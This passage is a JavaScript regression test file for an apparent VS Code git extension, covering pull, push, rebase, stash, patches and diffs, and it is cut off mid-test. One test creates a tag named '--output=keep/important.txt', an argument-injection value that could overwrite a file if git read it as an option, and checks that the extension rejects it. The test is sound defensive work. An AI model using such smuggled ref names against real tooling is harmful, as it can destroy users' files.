'use strict';

/**
 * Regression tests for bugs found in review, run against real repositories.
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const { execFileSync } = require('child_process');
const { createRepo, makeTempDir } = require('./helpers/repo');
const { Repository, INDEX } = require('../src/git/repository');
const { parseTodo } = require('../src/git/rebaseTodo');

/** Load a VS Code-layer module with the in-memory vscode mock installed. */
function requireWithVscode(mod) {
  const { createVscode, installVscodeMock } = require('./helpers/vscodeMock');
  if (!requireWithVscode.installed) {
    installVscodeMock(createVscode());
    requireWithVscode.installed = true;
  }
  return require(mod);
}

async function setup(t) {
  const r = createRepo();
  const repo = await Repository.open(r.dir);
  // Its git processes stop before its folder goes (Windows cannot remove a folder in use).
  t.after(() => {
    repo.dispose();
    return r.cleanup();
  });
  return { r, repo };
}

/** A bare "origin" plus a second clone that can push to it (the "other developer"). */
function withRemote(t, r) {
  const remoteDir = makeTempDir('cc-remote-');
  const otherDir = makeTempDir('cc-other-');
  t.after(() => {
    fs.rmSync(remoteDir, { recursive: true, force: true });
    fs.rmSync(otherDir, { recursive: true, force: true });
  });
  r.git('init', '-q', '--bare', remoteDir);
  r.git('remote', 'add', 'origin', remoteDir);
  r.git('push', '-q', '-u', 'origin', 'main');
  execFileSync('git', ['clone', '-q', remoteDir, otherDir]);
  const other = (...args) => execFileSync('git', args, { cwd: otherDir, encoding: 'utf8' }).trim();
  const otherCommit = (msg, file, content) => {
    fs.writeFileSync(path.join(otherDir, file), content);
    other('add', '-A');
    other('commit', '-q', '-m', msg);
  };
  return { remoteDir, other, otherCommit };
}

test('commit messages keep lines starting with #', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('init', { 'a.txt': '1\n' });
  r.write('a.txt', '2\n');
  await repo.stage(['a.txt']);
  await repo.commit('#42 fix crash\n\n## Details\nbody');
  assert.equal(r.git('log', '-1', '--format=%B'), '#42 fix crash\n\n## Details\nbody');
});

test('pull with diverged branches merges (git >= 2.33 would otherwise refuse)', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const { otherCommit, other } = withRemote(t, r);
  otherCommit('remote work', 'remote.txt', 'r\n');
  other('push', '-q');
  r.commit('local work', { 'local.txt': 'l\n' });
  await repo.pull();
  assert.ok(fs.existsSync(path.join(r.dir, 'remote.txt')));
  assert.equal(r.git('log', '-1', '--format=%p').split(' ').length, 2, 'a merge commit was created');
});

test('pull honours pull.rebase=true from git config', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const { otherCommit, other } = withRemote(t, r);
  otherCommit('remote work', 'remote.txt', 'r\n');
  other('push', '-q');
  r.commit('local work', { 'local.txt': 'l\n' });
  r.git('config', 'pull.rebase', 'true');
  await repo.pull();
  assert.equal(r.git('log', '-1', '--format=%s'), 'local work');
  assert.equal(r.git('log', '-1', '--format=%p').split(' ').length, 1, 'history stayed linear');
});

test('push works when the local branch name differs from its upstream', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const { remoteDir } = withRemote(t, r);
  await repo.checkoutTracking('origin/main', 'main-2');
  r.commit('on main-2', { 'b.txt': 'b\n' });
  // Like push.default=simple, the target must be explicit when the names differ.
  await assert.rejects(repo.push(), (e) => e.code === 'UpstreamNameMismatch');
  await repo.push({ to: 'upstream' });
  assert.equal(execFileSync('git', ['log', '-1', '--format=%s', 'main'], { cwd: remoteDir, encoding: 'utf8' }).trim(), 'on main-2');
});

test('network operations do not block local writes', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  // A remote whose transport hangs for 2 seconds.
  r.git('remote', 'add', 'slow', 'ssh://example.invalid/repo.git');
  r.git('config', 'core.sshCommand', 'sleep 2; false');
  const fetching = repo.fetch({ remote: 'slow' }).catch(() => 'failed');
  await new Promise((res) => setTimeout(res, 100));
  r.write('a.txt', '2\n');
  const started = Date.now();
  await repo.stage(['a.txt']);
  assert.ok(Date.now() - started < 1500, `stage waited ${Date.now() - started} ms for the fetch`);
  assert.equal(await fetching, 'failed');
});

test('PR diff uses GitHub\'s base tip even when the local base branch is stale', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'f.txt': '1\n' });
  const { remoteDir, other, otherCommit } = withRemote(t, r);
  // main moves on remotely; our origin/main stays stale.
  otherCommit('main 1', 'm1.txt', '1\n');
  otherCommit('main 2', 'm2.txt', '2\n');
  other('push', '-q');
  // PR branch on top of the newest main, plus a test-merge ref like GitHub publishes.
  other('checkout', '-q', '-b', 'pr');
  otherCommit('pr work', 'pr.txt', 'p\n');
  const head = other('rev-parse', 'HEAD');
  other('push', '-q', 'origin', `${head}:refs/pull/5/head`);
  other('checkout', '-q', 'main');
  other('merge', '-q', '--no-ff', '-m', 'test merge', 'pr');
  other('push', '-q', 'origin', 'HEAD:refs/pull/5/merge');
  other('reset', '-q', '--hard', 'HEAD~1');
  void remoteDir;
  const sha = await repo.fetchPullRequest('origin', 5, { withMerge: true });
  const { mergeBase } = await repo.resolvePullRequestBase('origin', 5, sha);
  const files = await repo.diffFiles(mergeBase, sha);
  assert.deepEqual(files.map((f) => f.path), ['pr.txt']);
});

test('checked-out PR branches track refs/pull/<n>/head and pull new commits', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'f.txt': '1\n' });
  const { other, otherCommit } = withRemote(t, r);
  other('checkout', '-q', '-b', 'pr');
  otherCommit('pr 1', 'p1.txt', '1\n');
  other('push', '-q', 'origin', 'HEAD:refs/pull/9/head');
  const sha = await repo.fetchPullRequest('origin', 9);
  await repo.checkoutPullRequest('origin', 9, 'pr/9', sha);
  otherCommit('pr 2', 'p2.txt', '2\n');
  other('push', '-q', '-f', 'origin', 'HEAD:refs/pull/9/head');
  await repo.pull();
  assert.equal(r.git('log', '-1', '--format=%s'), 'pr 2');
});

test('paths containing [ ] are taken literally, not as globs', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('init', { 'pages/[id].tsx': 'a\n', 'pages/i.tsx': 'b\n' });
  r.write('pages/[id].tsx', 'a2\n');
  r.write('pages/i.tsx', 'b2\n');
  await repo.stage(['pages/[id].tsx']);
  const s = await repo.refreshState();
  assert.deepEqual(s.staged.map((e) => e.path), ['pages/[id].tsx']);
});

test('a workspace opened through a symlink maps paths onto the repository', { skip: process.platform === 'win32' && 'symbolic links need privileges on Windows' }, async (t) => {
  const { r } = await setup(t);
  r.commit('init', { 'src/a.txt': '1\n' });
  const linkParent = makeTempDir('cc-link-');
  t.after(() => fs.rmSync(linkParent, { recursive: true, force: true }));
  const link = path.join(linkParent, 'link');
  fs.symlinkSync(r.dir, link);
  const repo = await Repository.open(path.join(link, 'src'));
  assert.equal(repo.root, r.dir);
  assert.equal(repo.displayRoot, link);
  const fileViaLink = path.join(link, 'src', 'a.txt');
  assert.ok(repo.contains(fileViaLink));
  assert.equal(repo.relative(fileViaLink), 'src/a.txt');
  assert.equal(repo.absolute('src/a.txt'), fileViaLink);
});

test('stash apply falls back when the staged state cannot be restored, and conflicts can be undone', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('init', { 'a.txt': '1\n' });
  r.write('a.txt', 'stashed\n');
  await repo.stashPush({ message: 'x' });
  r.commit('conflicting', { 'a.txt': 'committed\n' });
  await assert.rejects(repo.stashApply('stash@{0}', false), (e) => e.code === 'Conflict');
  assert.equal((await repo.getStashes()).length, 1, 'the stash is kept');
  await repo.abortOperation('stash');
  assert.equal(r.read('a.txt'), 'committed\n');
});

test('interactive rebase keeps git in charge of which commits are rebased', async (t) => {
  const { r, repo } = await setup(t);
  const base = r.commit('base', { 'f.txt': '' });
  const a = r.commit('a', { 'a.txt': 'a\n' });
  const b = r.commit('b', { 'b.txt': 'b\n' });
  // A plan that mentions a commit git will not include (an unrelated SHA): it must be ignored, not crash.
  const bogus = 'f'.repeat(40);
  const { entries } = parseTodo(`pick ${b} b\npick ${bogus} bogus\npick ${a} a\n`);
  await repo.rebaseInteractive(base, entries);
  assert.deepEqual(r.git('log', '--format=%s', '-3').split('\n'), ['a', 'b', 'base']);
});

test('bisect finds the first bad commit', async (t) => {
  const { r, repo } = await setup(t);
  const good = r.commit('good', { 'v.txt': 'ok\n' });
  r.commit('still good', { 'w.txt': '1\n' });
  const culprit = r.commit('introduce bug', { 'v.txt': 'BUG\n' });
  r.commit('later', { 'x.txt': '1\n' });
  await repo.bisectStart('HEAD', good);
  let result;
  for (let i = 0; i < 5; i++) {
    const bad = r.read('v.txt').includes('BUG');
    result = await repo.bisectMark(bad ? 'bad' : 'good');
    if (result.done) break;
  }
  assert.equal(result.culprit, culprit);
  await repo.bisectReset();
  assert.equal((await repo.refreshState()).operation, undefined);
});

test('patches: format-patch series apply as commits elsewhere; working-tree diffs apply too', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('init', { 'a.txt': '1\n' });
  r.git('checkout', '-q', '-b', 'feature');
  const c1 = r.commit('feature 1', { 'b.txt': 'b\n' });
  const c2 = r.commit('feature 2', { 'c.txt': 'c\n' });
  const patch = await repo.formatPatch([c2, c1]);
  r.git('checkout', '-q', 'main');
  await repo.applyPatch(patch, true);
  assert.deepEqual(r.git('log', '--format=%s', '-2').split('\n'), ['feature 2', 'feature 1']);
  r.write('a.txt', 'changed\n');
  const diff = await repo.diffPatch('unstaged');
  r.git('checkout', '-q', '--', 'a.txt');
  await repo.applyPatch(diff, false);
  assert.equal(r.read('a.txt'), 'changed\n');
});

test('line history reports the path a file had in each commit', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('add', { 'old.txt': 'a\nb\n' });
  r.commit('edit', { 'old.txt': 'a\nB\n' });
  r.git('mv', 'old.txt', 'new.txt');
  r.commit('rename');
  r.commit('edit again', { 'new.txt': 'a\nB2\n' });
  const hist = await repo.lineHistory('new.txt', 2, 2);
  assert.deepEqual(hist.map((c) => [c.subject, c.change.path]), [['edit again', 'new.txt'], ['edit', 'old.txt'], ['add', 'old.txt']]);
});

test('index edits keep CRLF/BOM handling to the editor layer: blobs round-trip byte-exact', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('init', { 'a.txt': '﻿l1\r\nl2\r\n' });
  const text = await repo.showText(INDEX, 'a.txt');
  await repo.writeIndexContent('a.txt', text);
  assert.equal(r.git('status', '--porcelain'), '');
});

test('hooks see the user\'s environment: glob pathspecs in a pre-commit hook still work', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('init', { 'a.txt': '1\n' });
  const out = path.join(r.dir, '.git', 'hook-out');
  const hook = path.join(r.dir, '.git', 'hooks', 'pre-commit');
  fs.writeFileSync(hook, `#!/bin/sh\ngit diff --cached --name-only -- '*.txt' > "${out}"\necho "LC_ALL=$LC_ALL" >> "${out}"\n`, { mode: 0o755 });
  r.write('a.txt', '2\n');
  await repo.stage(['a.txt']);
  await repo.commit('change');
  const lines = fs.readFileSync(out, 'utf8').split('\n');
  assert.equal(lines[0], 'a.txt');
  assert.notEqual(lines[1], 'LC_ALL=C');
});

test('the rebase sequence editor aborts instead of dropping commits missing from the plan', async (t) => {
  const { r, repo } = await setup(t);
  const base = r.commit('base', { 'f.txt': '' });
  const a = r.commit('a', { 'a.txt': 'a\n' });
  r.commit('b', { 'b.txt': 'b\n' });
  const head = r.git('rev-parse', 'HEAD');
  const { entries } = parseTodo(`pick ${a} a\n`); // plan forgot "b"
  await assert.rejects(repo.rebaseInteractive(base, entries));
  assert.equal(r.git('rev-parse', 'HEAD'), head, 'history untouched');
  assert.equal((await repo.refreshState()).operation, undefined);
});

test('accept theirs on a modify/delete conflict resolves to the deletion', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'f.txt': 'base\n', 'keep.txt': 'k\n' });
  r.git('checkout', '-q', '-b', 'topic');
  r.git('rm', '-q', 'f.txt');
  r.commit('delete f');
  r.git('checkout', '-q', 'main');
  r.commit('modify f', { 'f.txt': 'changed\n' });
  await assert.rejects(repo.merge('topic'));
  await repo.resolveWith('f.txt', 'theirs');
  const s = await repo.refreshState();
  assert.equal(s.conflicts.length, 0);
  assert.ok(!fs.existsSync(path.join(r.dir, 'f.txt')));
});

test('pushing a checked-out PR branch is refused with a clear error', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'f.txt': '1\n' });
  const { other, otherCommit } = withRemote(t, r);
  other('checkout', '-q', '-b', 'pr');
  otherCommit('pr 1', 'p1.txt', '1\n');
  other('push', '-q', 'origin', 'HEAD:refs/pull/3/head');
  const sha = await repo.fetchPullRequest('origin', 3);
  await repo.checkoutPullRequest('origin', 3, 'pr/3', sha);
  r.commit('fix', { 'x.txt': 'x\n' });
  await assert.rejects(repo.push(), (e) => e.code === 'PullRequestUpstream');
});

test('completing a conflicted merge without a message drops git\'s comment lines', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'f.txt': 'base\n' });
  r.git('checkout', '-q', '-b', 'topic');
  r.commit('topic', { 'f.txt': 'topic\n' });
  r.git('checkout', '-q', 'main');
  r.commit('main', { 'f.txt': 'main\n' });
  await assert.rejects(repo.merge('topic'));
  await repo.resolveWith('f.txt', 'theirs');
  await repo.continueOperation('merge');
  assert.ok(!/^#/m.test(r.git('log', '-1', '--format=%B')));
});

test('a commit at an edit stop of a rebase is recognised as such', async (t) => {
  const { r, repo } = await setup(t);
  const base = r.commit('base', { 'f.txt': '' });
  const a = r.commit('a', { 'a.txt': 'a\n' });
  const { entries } = parseTodo(`edit ${a} a\n`);
  await repo.rebaseInteractive(base, entries).catch(() => {});
  assert.equal((await repo.refreshState()).operation.kind, 'rebase');
  assert.equal(await repo.isRebaseEditStop(), true);
  r.write('n.txt', 'n\n');
  await repo.stage(['n.txt']);
  await repo.commit('separate commit');
  await repo.continueOperation('rebase');
  assert.deepEqual(r.git('log', '--format=%s', '-3').split('\n'), ['separate commit', 'a', 'base']);
});

test('commit --only commits just the selected files and keeps other staged changes staged', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('init', { 'a.txt': '1\n', 'b.txt': '1\n' });
  r.write('a.txt', '2\n');
  r.write('b.txt', '2\n');
  await repo.stage(['b.txt']);
  await repo.commit('only a', { only: ['a.txt'] });
  assert.equal(r.git('show', '--name-only', '--format=', 'HEAD'), 'a.txt');
  assert.equal(r.git('diff', '--cached', '--name-only'), 'b.txt');
});

test('a ref named like an option is never passed to git as an option', async (t) => {
  const { r, repo } = await setup(t);
  const sha = r.commit('init', { 'a.txt': '1\n' });
  // A file git would overwrite if the tag reached it as "--output=<file>" (a path relative to
  // the repository: an absolute one is no valid ref name on Windows, "c:\…").
  const victimName = 'keep/important.txt';
  const victim = path.join(r.dir, 'keep', 'important.txt');
  r.write(victimName, 'IMPORTANT DATA');
  // Such a tag arrives with an ordinary fetch; create it directly here.
  r.git('update-ref', `refs/tags/--output=${victimName}`, sha);
  const tag = (await repo.getRefs()).find((x) => x.type === 'tag');
  assert.equal(tag.rev, `refs/tags/--output=${victimName}`, 'the full name is used for git');
  await repo.diffFiles(tag.rev);
  await assert.rejects(repo.diffFiles(tag.name), /looks like an option/);
  await assert.rejects(repo.log({ revs: [tag.name] }), /looks like an option/);
  assert.equal(fs.readFileSync(victim, 'utf8'), 'IMPORTANT DATA');
});

test('large path lists go through stdin, and an empty list stages nothing', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('init', { 'keep.txt': '1\n' });
  const files = Array.from({ length: 600 }, (_, i) => `dir/[${i}] file ${i}.txt`);
  for (const f of files) r.write(f, 'x\n');
  r.write('other.txt', 'untracked\n');
  await repo.stage([]);
  assert.equal(r.git('diff', '--cached', '--name-only'), '', 'empty list staged nothing');
  await repo.stage(files);
  let s = await repo.refreshState();
  assert.equal(s.staged.length, 600);
  assert.deepEqual(s.untracked.map((e) => e.path), ['other.txt']);
  await repo.unstage(files);
  s = await repo.refreshState();
  assert.equal(s.staged.length, 0);
  await repo.stashPush({ paths: files.slice(0, 300), includeUntracked: true });
  assert.equal((await repo.getStashes()).length, 1);
});

test('fixup into a commit before a merge is refused without leaving a fixup commit', async (t) => {
  const { r, repo } = await setup(t);
  const target = r.commit('target', { 'a.txt': '1\n' });
  r.git('checkout', '-q', '-b', 'side');
  r.commit('side', { 's.txt': 's\n' });
  r.git('checkout', '-q', 'main');
  r.commit('main', { 'm.txt': 'm\n' });
  r.git('merge', '-q', '--no-ff', '-m', 'merge side', 'side');
  const head = r.git('rev-parse', 'HEAD');
  r.write('a.txt', '2\n');
  await repo.stage(['a.txt']);
  await assert.rejects(repo.fixupInto(target), /merge commits/);
  assert.equal(r.git('rev-parse', 'HEAD'), head);
  assert.equal(r.git('diff', '--cached', '--name-only'), 'a.txt', 'staged changes untouched');
});

test('undoing a merge commit is refused instead of silently dropping the second parent', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  r.git('checkout', '-q', '-b', 'side');
  r.commit('side', { 's.txt': 's\n' });
  r.git('checkout', '-q', 'main');
  r.commit('main', { 'm.txt': 'm\n' });
  r.git('merge', '-q', '--no-ff', '-m', 'merge', 'side');
  await assert.rejects(repo.undoLastCommit(), /merge/);
});

test('error classification: credential problems are not reported as network problems', () => {
  const { classify } = require('../src/git/exec');
  assert.equal(classify('git@github.com: Permission denied (publickey).\nfatal: Could not read from remote repository.', 128), 'AuthenticationFailed');
  assert.equal(classify("fatal: unable to access 'https://github.com/o/r/': The requested URL returned error: 403", 128), 'AuthenticationFailed');
  assert.equal(classify("fatal: unable to access 'https://x/': Could not resolve host: x", 128), 'NetworkError');
});

test('blob reads at fixed revisions go through one batch process and handle misses and binaries', async (t) => {
  const { r, repo } = await setup(t);
  const bin = Buffer.from(Array.from({ length: 70000 }, (_, i) => i % 256));
  r.write('a.txt', 'one\n');
  fs.writeFileSync(path.join(r.dir, 'bin.dat'), bin);
  const c1 = r.commit('one');
  const c2 = r.commit('two', { 'a.txt': 'two\n' });
  const results = await Promise.all([
    repo.showText(c1, 'a.txt'),
    repo.showText(c2, 'a.txt'),
    repo.showText(c2, 'missing.txt'),
    repo.show(c2, 'bin.dat'),
    repo.showText(`${c2}^`, 'a.txt'),
    repo.showText(c2, 'dir-that-is-not-a-file'),
  ]);
  assert.deepEqual(results.slice(0, 3), ['one\n', 'two\n', null]);
  assert.ok(results[3].equals(bin));
  assert.equal(results[4], 'one\n');
  assert.equal(results[5], null);
  assert.ok(repo.blobs && repo.blobs.proc, 'batch process in use');
  repo.dispose();
});


test('a branch created from origin/main does not track it and never pushes onto main', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'f.txt': '1\n' });
  const { remoteDir } = withRemote(t, r);
  r.git('fetch', '-q', 'origin');
  await repo.createBranch('feature-x', 'origin/main', true);
  assert.equal(r.git('config', '--default', '', 'branch.feature-x.merge'), '', 'no upstream was set');
  r.commit('feature work', { 'x.txt': 'x\n' });
  // Same name from a remote branch still tracks.
  await repo.createBranch('main-copy', 'origin/main', false);
  await repo.createBranch('main', 'origin/main', false).catch(() => {}); // exists already
  await repo.push({ remote: 'origin', refspec: 'feature-x', setUpstream: true });
  const remoteMain = execFileSync('git', ['log', '-1', '--format=%s', 'main'], { cwd: remoteDir, encoding: 'utf8' }).trim();
  assert.equal(remoteMain, 'base', 'origin/main untouched');
  // And with a mismatched upstream configured by hand, a plain push refuses.
  r.git('branch', '--set-upstream-to=origin/main', 'feature-x');
  await assert.rejects(repo.push(), (e) => e.code === 'UpstreamNameMismatch');
});

test('the batch blob reader handles large blobs in linear time', async (t) => {
  const { r, repo } = await setup(t);
  const big = Buffer.alloc(30 * 1024 * 1024, 7);
  fs.writeFileSync(path.join(r.dir, 'big.bin'), big);
  const sha = r.commit('big');
  const started = Date.now();
  const [a, b] = await Promise.all([repo.show(sha, 'big.bin'), repo.showText(sha, 'missing')]);
  assert.ok(Date.now() - started < 3000, `took ${Date.now() - started} ms`);
  assert.equal(a.length, big.length);
  assert.equal(b, null);
  repo.dispose();
});

test('commitStagedPaths commits only the staged state of the given files', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('init', { 'a.txt': '1\n2\n', 'b.txt': 'b\n' });
  r.write('a.txt', '1 staged\n2\n');
  await repo.stage(['a.txt']);
  r.write('a.txt', '1 staged\n2 unstaged\n'); // partially staged
  r.write('b.txt', 'b staged\n');
  await repo.stage(['b.txt']);
  await repo.commitStagedPaths('only a, staged part', ['a.txt']);
  assert.equal(r.git('show', 'HEAD:a.txt'), '1 staged\n2');
  assert.equal(r.git('show', 'HEAD:b.txt'), 'b', 'b not committed');
  assert.equal(r.git('diff', '--cached', '--name-only'), 'b.txt', 'b still staged');
  assert.equal(r.read('a.txt'), '1 staged\n2 unstaged\n', 'working tree untouched');
});

test('combined diff of non-adjacent commits contains exactly the selected changes', async (t) => {
  const { r, repo } = await setup(t);
  const pad = (lines) => lines.join('\n1\n2\n3\n4\n') + '\n';
  r.commit('base', { 'b.txt': pad(['top', 'middle', 'bottom']), 'a.txt': 'x\n' });
  const s1 = r.commit('s1', { 'b.txt': pad(['TOP', 'middle', 'bottom']) });
  r.commit('s2 (not selected)', { 'b.txt': pad(['TOP', 'MIDDLE', 'bottom']) });
  r.git('mv', 'a.txt', 'renamed.txt');
  r.commit('rename (not selected)');
  const s3 = r.commit('s3', { 'b.txt': pad(['TOP', 'MIDDLE', 'BOTTOM']) });
  const { files, exact } = await repo.getMultiCommitChanges([s3, s1]);
  assert.equal(exact, true);
  assert.deepEqual(files.map((f) => f.path), ['b.txt'], 'the unselected rename does not appear');
  const b = files[0];
  assert.equal(await repo.showText(b.afterRef, 'b.txt'), pad(['TOP', 'middle', 'BOTTOM']), "s2's edit is not included");
  repo.dispose();
});

test('combined diff falls back (and says so) when a selected commit depends on an unselected one', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'f.txt': '1\n' });
  const s1 = r.commit('s1', { 'g.txt': 'g\n' });
  r.commit('unselected', { 'f.txt': '2\n' });
  const s3 = r.commit('s3 builds on it', { 'f.txt': '3\n' });
  const res = await repo.getMultiCommitChanges([s1, s3]);
  assert.equal(res.exact, false);
  assert.deepEqual(res.failed, [s3]);
  assert.ok(res.files.some((f) => f.path === 'f.txt'));
});

test('submodule changes are shown as "Subproject commit" text on both sides', async (t) => {
  const { r, repo } = await setup(t);
  const sub = createRepo();
  t.after(() => sub.cleanup());
  const s1 = sub.commit('sub 1', { 's.txt': '1\n' });
  r.commit('base', { 'f.txt': '1\n' });
  execFileSync('git', ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', sub.dir, 'mod'], { cwd: r.dir });
  r.commit('add submodule');
  const s2 = sub.commit('sub 2', { 's.txt': '2\n' });
  execFileSync('git', ['fetch', '-q'], { cwd: path.join(r.dir, 'mod') });
  execFileSync('git', ['checkout', '-q', s2], { cwd: path.join(r.dir, 'mod') });
  assert.equal(await repo.showText('HEAD', 'mod'), `Subproject commit ${s1}\n`);
  assert.equal(await repo.showText(INDEX, 'mod'), `Subproject commit ${s1}\n`);
  assert.equal(await repo.showText(require('../src/git/repository').WORKTREE, 'mod'), `Subproject commit ${s2}\n`);
  assert.equal(await repo.showText(r.git('rev-parse', 'HEAD'), 'mod'), `Subproject commit ${s1}\n`);
  repo.dispose();
});

test('rewording runs the commit-msg hook but not pre-commit', async (t) => {
  const { r, repo } = await setup(t);
  const base = r.commit('base', { 'f.txt': '' });
  const a = r.commit('a', { 'a.txt': 'a\n' });
  const hooks = path.join(r.dir, '.git', 'hooks');
  fs.writeFileSync(path.join(hooks, 'pre-commit'), '#!/bin/sh\nexit 1\n', { mode: 0o755 });
  fs.writeFileSync(path.join(hooks, 'commit-msg'), '#!/bin/sh\necho "Signed-by-hook: yes" >> "$1"\n', { mode: 0o755 });
  const { entries } = parseTodo(`pick ${a} a\n`);
  await repo.rebaseInteractive(base, entries, new Map([[0, 'a reworded\n']]));
  assert.equal(r.git('log', '-1', '--format=%B'), 'a reworded\nSigned-by-hook: yes');
});

test('option-like names are deleted as names', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('init', { 'f.txt': '1\n' });
  r.git('update-ref', 'refs/tags/--x', 'HEAD');
  r.git('update-ref', 'refs/heads/--y', 'HEAD');
  await repo.deleteTag('refs/tags/--x');
  await repo.deleteBranch('--y', true);
  assert.equal(r.git('for-each-ref', 'refs/tags/--x', 'refs/heads/--y'), '');
});

test('index reads of a path that looks like a stage spec ("1:foo")', { skip: process.platform === 'win32' && 'Windows does not allow ":" in file names' }, async (t) => {
  const { r, repo } = await setup(t);
  r.commit('init', { '1:foo': 'colon\n', foo: 'plain\n' });
  assert.equal(await repo.showText(INDEX, '1:foo'), 'colon\n');
});

// ---------------------------------------------------------------------------
test('combined diff stays exact with diff.noprefix and textconv in the user config', async (t) => {
  const { r, repo } = await setup(t);
  const pad = (lines) => lines.join('\n1\n2\n3\n4\n') + '\n';
  r.commit('base', { 'b.txt': pad(['top', 'middle', 'bottom']) });
  const s1 = r.commit('s1', { 'b.txt': pad(['TOP', 'middle', 'bottom']) });
  r.commit('unselected', { 'b.txt': pad(['TOP', 'MIDDLE', 'bottom']) });
  const s3 = r.commit('s3', { 'b.txt': pad(['TOP', 'MIDDLE', 'BOTTOM']) });
  r.git('config', 'diff.noprefix', 'true');
  r.git('config', 'diff.mnemonicPrefix', 'true');
  r.git('config', 'diff.upper.textconv', 'tr a-z A-Z');
  fs.writeFileSync(path.join(r.dir, '.git', 'info', 'attributes'), '*.txt diff=upper\n');
  const res = await repo.getMultiCommitChanges([s3, s1]);
  assert.equal(res.exact, true, `failed: ${res.failed}`);
  assert.equal(await repo.showText(res.files[0].afterRef, 'b.txt'), pad(['TOP', 'middle', 'BOTTOM']));
  const patch = await repo.formatPatch([s1]);
  assert.match(patch, /^diff --git a\/b\.txt b\/b\.txt$/m, 'patches always use a/ b/ prefixes');
  r.write('b.txt', 'changed\n');
  assert.match(await repo.diffPatch('all'), /^--- a\/b\.txt$/m);
  assert.doesNotMatch(await repo.diffPatch('all'), /CHANGED/, 'no textconv in patches');
  repo.dispose();
});

test('an unbroken chain of selected commits is combined without replaying', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const c1 = r.commit('c1', { 'a.txt': '2\n' });
  const c2 = r.commit('c2', { 'b.txt': 'b\n' });
  const res = await repo.getMultiCommitChanges([c2, c1]);
  assert.equal(res.exact, true);
  assert.equal(res.tree, r.git('rev-parse', `${c2}^{tree}`));
  assert.deepEqual(res.files.map((f) => f.path).sort(), ['a.txt', 'b.txt']);
  repo.dispose();
});

test('a combined diff nobody waits for any more can be cancelled', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const c1 = r.commit('c1', { 'a.txt': '2\n' });
  r.commit('gap', { 'g.txt': 'g\n' });
  const c3 = r.commit('c3', { 'b.txt': 'b\n' });
  const controller = new AbortController();
  controller.abort();
  await assert.rejects(repo.getMultiCommitChanges([c1, c3], { signal: controller.signal }), (e) => e.code === 'Cancelled');
  repo.dispose();
});

test('line staging keeps CRLF lines of the index with core.autocrlf=input', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('crlf', { 'w.txt': 'l1\r\nl2\r\nl3\r\nl4\r\n' });
  r.git('config', 'core.autocrlf', 'input');
  await repo.writeIndexContent('w.txt', 'l1\r\nL2\r\nl3\r\nl4\r\n', undefined, { asIs: true });
  assert.equal(r.git('diff', '--cached', '--numstat'), '1\t1\tw.txt', 'only the edited line changes');
  repo.dispose();
});

test('Commit Selected commits a symlink from the working tree as a symlink', { skip: process.platform === 'win32' }, async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': 'a\n', 'b.txt': 'b\n' });
  fs.symlinkSync('a.txt', path.join(r.dir, 'link'));
  r.git('add', 'link');
  r.git('commit', '-q', '-m', 'link');
  r.write('a.txt', 'staged a\n');
  r.git('add', 'a.txt');
  fs.unlinkSync(path.join(r.dir, 'link'));
  fs.symlinkSync('b.txt', path.join(r.dir, 'link'));
  await repo.commitStagedPaths('both', ['a.txt', 'link'], { workingTreePaths: ['link'] });
  assert.match(r.git('ls-tree', 'HEAD', 'link'), /^120000 blob /);
  assert.equal(r.git('cat-file', 'blob', 'HEAD:link'), 'b.txt');
  assert.equal(r.git('status', '--porcelain'), '');
  repo.dispose();
});

test('fetch leaves pruning to remote.<name>.prune when it is set', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const { other } = withRemote(t, r);
  other('push', '-q', 'origin', 'HEAD:refs/heads/stale');
  await repo.fetch({ remote: 'origin' });
  other('push', '-q', 'origin', ':stale');
  r.git('config', 'remote.origin.prune', 'false');
  await repo.fetch({ remote: 'origin' });
  assert.ok(r.git('branch', '-r').includes('origin/stale'), 'kept, as configured');
  r.git('config', '--unset', 'remote.origin.prune');
  await repo.fetch({ remote: 'origin' });
  assert.ok(!r.git('branch', '-r').includes('origin/stale'), 'pruned by default');
  repo.dispose();
});

test('pull.rebase and pull.ff accept every boolean spelling', () => {
  const { parseRebaseConfig } = require('../src/git/repository');
  for (const v of ['false', 'no', 'off', '0', 'FALSE', undefined]) assert.equal(parseRebaseConfig(v), false, String(v));
  for (const v of ['true', 'yes', 'on', '1', 'interactive', 'i']) assert.equal(parseRebaseConfig(v), true, v);
  assert.equal(parseRebaseConfig('merges'), 'merges');
});

test('pull.rebase=no merges instead of rebasing', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const { otherCommit, other } = withRemote(t, r);
  otherCommit('remote work', 'remote.txt', 'r\n');
  other('push', '-q');
  r.commit('local work', { 'local.txt': 'l\n' });
  r.git('config', 'pull.rebase', 'no');
  await repo.pull();
